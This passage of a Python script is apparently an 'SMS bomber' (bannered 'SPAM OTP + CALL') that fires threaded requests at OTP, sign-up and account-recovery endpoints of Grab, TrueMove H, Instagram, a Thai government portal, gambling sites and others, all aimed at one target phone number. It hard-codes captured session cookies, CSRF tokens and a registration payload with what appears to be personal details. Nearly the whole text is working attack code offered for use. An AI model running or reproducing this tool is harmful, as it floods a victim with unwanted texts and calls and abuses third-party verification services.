	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
	    }
	requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
  
def api87():
	    post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})


def api88():
	requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})

def api89():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def api90():
	requests.post("https://bacara888.com/api/otp/register",json={"applicant":phone,"serviceName":"gclub"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","cookie":"_ga=GA1.2.600445810.1648202009;_gid=GA1.2.1634649368.1648202009;PHPSESSID=ehi2ceis3aph6d46ktk0819435;_gat_gtag_UA_136950045_1=1"})

def api91():
	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def api92():
	requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

def api93():
	head = {
	    "Host": "id.zilingo.com",
	    "content-length": "153",
	    "accept": "application/json, text/plain, */*",
	    "content-type": "application/json",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://id.zilingo.com",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
	    "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
	    }
	requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"}).text
	
def api94():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    
def api95():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 

def api96():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    
def api97():
	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    
def api98():
	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})

def api99():
	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})

def api100():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	
def api101():
    requests.post("https://bacara888.com/api/otp/register",json={"applicant":phone,"serviceName":"gclub"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","cookie":"_ga=GA1.2.600445810.1648202009;_gid=GA1.2.1634649368.1648202009;PHPSESSID=ehi2ceis3aph6d46ktk0819435;_gat_gtag_UA_136950045_1=1"})

def api102():
  requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
  
def api103():
  requests.post("https://api.jokerslotzz.com/public/request-otp",headers={
    "Host": "api.jokerslotzz.com",
"content-length": "25",
"accept": "application/json, text/plain, */*",
"content-type": "application/json;charset=UTF-8",
"sec-ch-ua-mobile": "?1",
"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"origin": "https://member.jokerslotzz.com","referer": "https://member.jokerslotzz.com/"
    },json={"username":f"{phone}"})

def api104():
	requests.post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
    
def api105():
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json


print(""" \033[1;94m════════════════════════════════════════════════ """)
print(""" \033[1;94mWUT ch""")
print(""" \033[1;94mWUT SHOP """)
print(""" \033[1;94mFB : WUT ch""")
print(""" \033[1;94mBY WUT ch""")
print(""" \033[1;94mSPAM SMS """)
print(""" ═════════════════════════════════════════════════════ """)
print("""  \033[91m>>>>>>SPAM OTP + CALL<<<<<<""")


for i in range(amount):
    threading.Thread(target=api1).start()
    print(f""" \033[1;91mยิงแล้ว| {phone}| !!""")
    threading.Thread(target=api2).start()
    print(f""" \033[1;91mcall{phone}|!!""")
    threading.Thread(target=api3).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api4).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api5).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api6).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api7).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api8).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api9).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api10).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api11).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api12).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api13).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api14).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api15).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api16).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api17).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api18).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api19).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api20).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api21).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api22).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api23).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api24).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api25).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api26).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api27).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api28).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api29).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api30).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api31).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api32).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api33).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api34).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api35).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api36).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api37).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api38).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api39).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api40).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api41).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api42).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api43).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api44).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api45).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api46).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api47).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api48).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api49).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api50).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api51).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api52).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api53).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api54).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api55).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api56).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api57).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api58).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""") 
    threading.Thread(target=api60).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api61).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api62).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api63).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api64).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api65).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api66).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api67).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api68).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api69).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api70).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api71).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api72).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api73).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api74).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api75).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api76).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api77).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api78).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api79).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api80).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api81).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api82).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api83).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api84).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api85).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api86).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api87).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api88).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api89).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api90).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api91).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api92).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api93).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api94).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api95).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api96).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api97).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api98).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api99).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api100).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api101).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api102).start()
    print(f""" \033[1;91mยิงแล้ว|{phone}| !!""")
    threading.Thread(target=api103).start()
    print(""" \033[1;92mยิงแล้ว!!""")
    threading.Thread(target=api104).start()
    print(f""" \033[1;93mยิงแล้ว| {phone}|!!""")
    threading.Thread(target=api105).start()
    print(f""" \033[1;93mยิงแล้ว| {phone}|!!""")
    os.system("clear")
     